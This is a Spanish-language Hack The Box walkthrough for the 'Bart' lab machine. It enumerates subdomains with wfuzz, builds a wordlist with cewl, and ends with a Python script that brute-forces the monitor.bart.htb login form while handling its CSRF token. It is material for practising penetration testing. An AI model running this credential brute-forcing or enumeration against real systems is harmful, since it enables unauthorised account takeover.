# Bart-HTB

## NMAP 

![image](https://github.com/gecr07/Bart-HTB/assets/63270579/2d9d0c51-4e1f-49f5-a613-c08cf759eedf)

Ponermos en el hosts el subdominio "http://forum.bart.htb/"  Si vemos la pagina tiene varios usuarios (moraleja siempre revisa los comentatios html <!-- )

![image](https://github.com/gecr07/Bart-HTB/assets/63270579/1cc0bd8a-0fcd-4f13-bf6e-8a1939bdd22e)



## WFUZZ 

Vamos a enumerar en busca de otros subdominios

```bash
 wfuzz -c -t 200  --hc=302,404 -w /usr/share/seclists/Discovery/DNS/deepmagic.com-prefixes-top50000.txt -H "Host: FUZZ.bart.htb"  http://10.129.96.185/

```

Encontramos un subdominio nuevo "monitor"


![image](https://github.com/gecr07/Bart-HTB/assets/63270579/cc964f92-3d61-49a5-b8a0-419bf0651268)

Si lo revisamos no encontre nada entonces lo que se me ocurre es un ataque de fuerza bruta....

## CEWL

Esto sirve para crear diccionarios en base a las mismas palabras de la pagina.

```bash
cewl -w cewl-forum.txt -e -a http://forum.bart.htb

‐e, ‐‐email
                     Include email addresses.

 ‐a, ‐‐meta
                     Include meta data.


```


### TR Mayusculas a Minusculas

Para cambiar de mayusculas a minuculas

```bash
tr '[:upper:]' '[:lower:]'
```


## Brute Force Alternativa a cosas como Hydra

Esto es una alternativa a hydra para hacer brute force lo que si falta es ponerle hilos para que vaya mas rapido

```python
#!/usr/bin/python3

import requests, pdb, sys, time, re, signal
import urllib3, threading


def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


url = 'http://monitor.bart.htb/index.php'
burp = { 'http': 'http://127.0.0.1:8080'}



def main():
	#time.sleep(10)
	s=requests.session()
	r = s.get(url)
	#print(r.text)
	csrfToken = re.findall(r'name="csrf" value="(.*?)"',r.text)[0]
	#pdb.set_trace()# l y p para ver valores.


	with open("user.txt", "rb") as users_file:
		usuarios = [linea.decode().strip() for linea in users_file]
	with open("passwords.txt", "rb") as passwords_file:
		contraseñas = [linea.decode().strip() for linea in passwords_file]
		for usuario in usuarios:
			for contraseña in contraseñas:
				#print(f"Probando: Usuario={usuario}, Contraseña={contraseña}")
				post_data = {'csrf': csrfToken,'user_name': usuario,'user_password': contraseña,'action':'Login'}
				r = s.post(url,data=post_data,proxies=burp)
				if "The information is incorrect"  not in r.text:
					print(f"Se encontro una contraseña correcta {usuario}:{contraseña}")
		
		



if __name__ == '__main__':
	main()

```



























































